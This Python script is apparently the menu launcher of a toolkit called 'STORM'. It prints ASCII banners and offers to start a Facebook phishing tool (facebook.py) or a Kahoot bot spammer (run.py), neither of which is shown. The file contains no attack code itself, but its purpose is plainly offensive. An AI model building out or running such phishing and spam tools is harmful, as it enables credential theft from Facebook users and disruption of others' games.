import os
import subprocess
import time

if os.name == "posix":
    subprocess.run(["clear"])
elif os.name == "nt":
    os.system("cls")

print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗")
print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║")
print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║")
print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║")
print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║")
print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝")
print("                                  version 3.0")
print("")
print("")
print("")
print("    [1] phishing")
print("")
print("    [2] kahoot bot spammer")
print("")
print("")


while True:
    option = input("    choose an option: ")
    if option == "1":
        if os.name == "posix":
            os.system("clear")
        elif os.name == "nt":
            os.system("cls")

        print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗      ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ")
        print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗")
        print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║      ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝")
        print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗")
        print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║")
        print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
        print("                                                                                           version 1.0")
        print("")
        print("")
        print("    [1] facebook")
        print("")
        print("")
        print("")

        phishing_option = input("    choose an option: ")
        if phishing_option == "1":
            subprocess.run(["python", "facebook.py"])


        break

    elif option == "2":
        if os.name == "posix":
            os.system("clear")
        elif os.name == "nt":
            os.system("cls")
        print("")
        print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗")
        print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║")
        print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║")
        print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║")
        print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║")
        print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝")
        print("")
        print("██╗  ██╗ █████╗ ██╗  ██╗ ██████╗  ██████╗ ████████╗")
        print("██║ ██╔╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗╚══██╔══╝")
        print("█████╔╝ ███████║███████║██║   ██║██║   ██║   ██║   ")
        print("██╔═██╗ ██╔══██║██╔══██║██║   ██║██║   ██║   ██║   ")
        print("██║  ██╗██║  ██║██║  ██║╚██████╔╝╚██████╔╝   ██║   ")
        print("╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ")
        print("")
        print("██████╗  ██████╗ ████████╗")
        print("██╔══██╗██╔═══██╗╚══██╔══╝")
        print("██████╔╝██║   ██║   ██║   ")
        print("██╔══██╗██║   ██║   ██║   ")
        print("██████╔╝╚██████╔╝   ██║   ")
        print("╚═════╝  ╚═════╝    ╚═╝   ")
        print("                                                     version 1.0");
        print("")
        print("")
        print("")
        print("")
        print("    [1] start")
        print("")
        print("")
        print("")
        

        kahoot_option = input("    choose an option: ")
        if kahoot_option == "1":
            if os.name == "posix":
                os.system("clear")
            elif os.name == "nt":
                os.system("cls")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            subprocess.run(["python", "run.py"])

        break


